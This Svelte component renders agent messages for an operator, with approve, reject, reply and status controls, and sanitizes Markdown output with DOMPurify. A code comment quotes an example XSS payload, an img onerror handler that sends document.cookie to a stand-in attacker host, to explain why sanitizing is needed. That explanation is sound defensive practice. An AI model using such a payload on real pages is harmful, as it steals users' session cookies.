<script lang="ts">
  import { createEventDispatcher } from 'svelte'
  import { marked } from 'marked'
  import DOMPurify from 'dompurify'
  import type { Message } from './types'

  export let message: Message

  const dispatch = createEventDispatcher<{
    approve: string
    reject: string
    setstatus: { id: string; status: string }
    reply: void
  }>()

  // Message bodies come from agents — sanitize the marked output before
  // injecting via {@html}. Without this a body like
  //   <img src=x onerror="fetch('http://attacker/exfil?'+document.cookie)">
  // would execute in the operator's webview. DOMPurify strips event
  // handlers, javascript: URLs, and disallowed tags by default.
  $: rendered = message
    ? DOMPurify.sanitize(marked.parse(message.body || '', { async: false }) as string)
    : ''
  $: needsApproval = message && message.status === 'unread' &&
                     (message.priority === 'action' || message.priority === 'urgent')
</script>

{#if message}
  <div class="flex flex-col h-full">
    <header class="px-4 py-3 border-b border-slate-700">
      <div class="text-xs text-slate-400 mb-1">
        <span class="text-slate-300 font-medium">{message.sender}</span>
        <span class="mx-1 text-slate-600">→</span>
        <span class="text-slate-300">{message.recipient}</span>
        <span class="mx-2 text-slate-600">·</span>
        <span class="uppercase tracking-wider {message.priority === 'urgent' ? 'text-red-400' : message.priority === 'action' ? 'text-amber-400' : 'text-slate-500'}">
          {message.priority}
        </span>
        <span class="mx-2 text-slate-600">·</span>
        <span>{message.status.replace('_', ' ')}</span>
        <span class="mx-2 text-slate-600">·</span>
        <span class="text-slate-500">{message.timestamp}</span>
      </div>
      <h2 class="text-lg text-slate-100">{message.subject}</h2>
      {#if message.parent_id}
        <div class="text-xs text-slate-500 mt-1">
          in reply to <code class="text-slate-400">{message.parent_id.slice(0, 8)}</code>
        </div>
      {/if}
    </header>

    <div class="flex-1 overflow-y-auto px-4 py-3">
      <div class="md-body">{@html rendered}</div>
    </div>

    <footer class="px-4 py-3 border-t border-slate-700 flex flex-wrap gap-2">
      {#if needsApproval}
        <button
          class="text-xs bg-emerald-700 hover:bg-emerald-600 text-white px-3 py-1.5 rounded font-medium"
          on:click={() => dispatch('approve', message.id)}
        >
          Approve
        </button>
        <button
          class="text-xs bg-red-700 hover:bg-red-600 text-white px-3 py-1.5 rounded font-medium"
          on:click={() => dispatch('reject', message.id)}
        >
          Reject
        </button>
      {/if}
      <button
        class="text-xs bg-ink-700 hover:bg-ink-800 text-slate-200 px-3 py-1.5 rounded border border-slate-600"
        on:click={() => dispatch('reply')}
      >
        Reply
      </button>
      {#if message.status !== 'in_progress'}
        <button
          class="text-xs bg-ink-700 hover:bg-ink-800 text-slate-300 px-3 py-1.5 rounded border border-slate-600"
          on:click={() => dispatch('setstatus', { id: message.id, status: 'in_progress' })}
        >
          Mark in progress
        </button>
      {/if}
      {#if message.status !== 'done'}
        <button
          class="text-xs bg-ink-700 hover:bg-ink-800 text-slate-300 px-3 py-1.5 rounded border border-slate-600"
          on:click={() => dispatch('setstatus', { id: message.id, status: 'done' })}
        >
          Mark done
        </button>
      {/if}
    </footer>
  </div>
{/if}
